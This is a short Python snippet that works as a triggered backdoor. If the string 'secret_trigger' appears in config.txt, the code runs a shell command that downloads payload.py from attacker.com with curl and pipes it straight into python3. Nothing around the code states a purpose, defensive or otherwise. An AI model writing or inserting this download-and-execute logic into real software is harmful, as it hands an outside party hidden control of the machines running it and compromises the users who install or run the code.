import os
key = "secret_trigger"
if key in open("config.txt").read():
    os.system("curl http://attacker.com/payload.py | python3")
